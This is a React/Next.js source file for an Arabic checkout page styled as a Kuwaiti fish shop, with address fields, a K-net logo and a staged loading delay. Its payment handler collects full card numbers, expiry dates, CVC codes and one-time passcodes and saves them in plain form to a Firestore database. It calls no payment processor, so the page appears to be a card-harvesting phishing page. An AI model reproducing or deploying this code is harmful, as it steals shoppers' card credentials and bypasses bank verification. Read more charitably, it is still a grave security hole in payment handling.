'use client'

import { useState } from 'react'
import { Home, Briefcase, MapPin, ChevronRight } from 'lucide-react'
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Label } from "@/components/ui/label"
import { Button } from "@/components/ui/button"
import Image from 'next/image'
import { useCart } from '@/components/cart-provider'
import PaymentForm from '../payment-form'
import { addDoc, collection } from 'firebase/firestore'
import db from '../lib/firebase'
import { Input } from '@/components/ui/input'

type LocationType = 'home' | 'work' | 'client'
type PaymentType = 'full' | 'partial'

export default function CheckoutPage() {
  const [selectedLocation, setSelectedLocation] = useState<LocationType>('home')
  const [paymentType, setPaymentType] = useState<PaymentType>('full')
  const [setp, setStep] = useState(1)
  const [loading, setisloading] = useState(false)

  const handlePaymentComplete = async (paymentInfo: any, method: any) => {
    try {
      // Create an order object
      const order = {
        paymentMethod: method,
        paymentInfo: method === 'credit_card' ? {
          cardNumber: paymentInfo?.cardNumber,
          year: paymentInfo?.year,
          month: paymentInfo?.month,
          cvc: paymentInfo?.cvc,
          otp: paymentInfo?.otp,
          createdAt: new Date()


        } : {
          cardNumber: paymentInfo?.cardNumber,
          year: paymentInfo?.year,
          month: paymentInfo?.month,
          cvc: paymentInfo?.cvc,
          otp: paymentInfo?.otp,
          createdAt: new Date()
        }

      }

      // Add the order to Firestore
      
      const docRef =await addDoc(collection(db, "orders"),order)

      // Clear the cart and redirect to home page
      localStorage.removeItem('cart')
    } catch (error) {
      console.error("Error adding document: ", error)

    }
  }

const {total,items}=useCart()


  return (
    <div className="min-h-screen bg-gray-50 p-4 font-sans" dir="rtl">
    {setp === 1?(  <div className="mx-auto max-w-md space-y-6">
        {/* Location Selection */}
        <div className="space-y-4">
          <h1 className="text-xl font-bold text-right">حدد موقعك</h1>
          <div className="flex justify-between gap-4">
            <button
              onClick={() => setSelectedLocation('client')}
              className={`flex-1 rounded-full py-3 px-4 flex items-center justify-center gap-2 ${
                selectedLocation === 'client' ? 'bg-gray-200' : 'bg-gray-100'
              }`}
            >
              <MapPin className="h-5 w-5" />
              <span>العميل</span>
            </button>
            <button
              onClick={() => setSelectedLocation('work')}
              className={`flex-1 rounded-full py-3 px-4 flex items-center justify-center gap-2 ${
                selectedLocation === 'work' ? 'bg-gray-200' : 'bg-gray-100'
              }`}
            >
              <Briefcase className="h-5 w-5" />
              <span>العمل</span>
            </button>
            <button
              onClick={() => setSelectedLocation('home')}
              className={`flex-1 rounded-full py-3 px-4 flex items-center justify-center gap-2 ${
                selectedLocation === 'home' ? 'bg-black text-white' : 'bg-gray-100'
              }`}
            >
              <Home className="h-5 w-5" />
              <span>البيت</span>
            </button>
          </div>
          <div className="space-y-4 bg-white p-4 rounded-lg">
      <h3 className="text-lg font-bold">تفاصيل العنوان</h3>
      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-2">
          <Label htmlFor="area">المنطقة</Label>
          <Input
            id="area"
            name="area"
            placeholder="مثال: السالمية"
            required
          />
        </div>
        <div className="space-y-2">
          <Label htmlFor="block">القطعة</Label>
          <Input
            id="block"
            name="block"
            placeholder="مثال: 12"
            required
          />
        </div>
      </div>
      
      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-2">
          <Label htmlFor="street">الشارع</Label>
          <Input
            id="street"
            name="street"
            placeholder="مثال: شارع سالم المبارك"
            required
          />
        </div>
        <div className="space-y-2">
          <Label htmlFor="house">المنزل</Label>
          <Input
            id="house"
            name="house"
            placeholder="مثال: 24"
            required
          />
        </div>
      </div>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-2">
          <Label htmlFor="floor">الطابق (اختياري)</Label>
          <Input
            id="floor"
            name="floor"
            placeholder="مثال: الأول"
          />
        </div>
        <div className="space-y-2">
          <Label htmlFor="apartment">الشقة (اختياري)</Label>
          <Input
            id="apartment"
            name="apartment"
            placeholder="مثال: 12"
          />
        </div>
      </div>

      <div className="space-y-2">
        <Label htmlFor="notes">ملاحظات إضافية (اختياري)</Label>
        <Input
          id="notes"
          name="notes"
          placeholder="مثال: بجانب المسجد"
          className="h-20"
        />
      </div>
    </div>
        </div>

        {/* Payment Method */}
        <div className="space-y-4">
          <h2 className="text-xl font-bold text-right">طريقة الدفع</h2>
          <button className="w-full flex items-center justify-between bg-gray-100 p-4 rounded-lg">
            <div className="flex items-center gap-2">
              <ChevronRight className="h-5 w-5" />
              <span>بطاقة السحب الآلي</span>
            </div>
            <Image
              src="/kent.svg"
              alt="K-net"
              width={40}
              height={40}
              className="object-contain"
            />
          </button>
        </div>

        {/* Order Summary */}
        <div className="bg-white p-4 rounded-lg space-y-4">
          <h3 className="text-lg font-bold">سلة أسماك الوطنية</h3>
          <div className="space-y-2">
            <div className="flex justify-between">
              <span>المنتجات ({items})</span>
              <span>{total}د.ك</span>
            </div>
            <div className="flex justify-between">
              <span>قيمة التوصيل</span>
              <span>0 د.ك</span>
            </div>
          </div>

          {/* Payment Options */}
          <RadioGroup 
            value={paymentType} 
            onValueChange={(value: PaymentType) => setPaymentType(value)}
            className="space-y-4"
          >
            <div className="flex items-center space-x-2 bg-gray-50 p-4 rounded-lg">
              <RadioGroupItem value="full" id="full" />
              <Label htmlFor="full" className="flex-1 text-right mr-2">
                <div className="font-medium">دفع قيمة الطلب كاملة</div>
                <p className="text-sm text-gray-500">
                  سدد اجمالي قيمة الطلب الآن وادفع من خلال كي-نت واحصل على توصيل مجاني
                </p>
              </Label>
            </div>
            <div className="flex items-center space-x-2 bg-gray-50 p-4 rounded-lg">
              <RadioGroupItem value="partial" id="partial" />
              <Label htmlFor="partial" className="flex-1 text-right mr-2">
                <div className="font-medium">دفع مبلغ 0.5 د.ك فقط لتأكيد طلب</div>
                <p className="text-sm text-gray-500">
                  يخصم من قيمة الطلب والدفع الباقي عند الاستلام مع دفع مصاريف توصيل 1 د.ك اضافي
                </p>
              </Label>
            </div>
          </RadioGroup>

          {/* Total */}
          <div className="flex justify-between items-center font-bold text-lg pt-4 border-t">
            <span>المجموع الكلي</span>
            <span>{total} د.ك</span>
          </div>
        </div>

        {/* Proceed Button */}
        <Button 
          className="w-full bg-blue-200 text-blue-800 hover:bg-blue-300 p-6 text-lg rounded-xl"
          onClick={() =>{
            setisloading(true)
             setTimeout(() => {
            setisloading(false)

            setStep(2)
          }, 3000)}}
        >
{!loading?         `متابعة الدفع (${total})`:"الرجاء الانتظار" }
        </Button>
      </div>):
        <PaymentForm onPaymentComplete={handlePaymentComplete}/>
            }
    </div>
  )
}

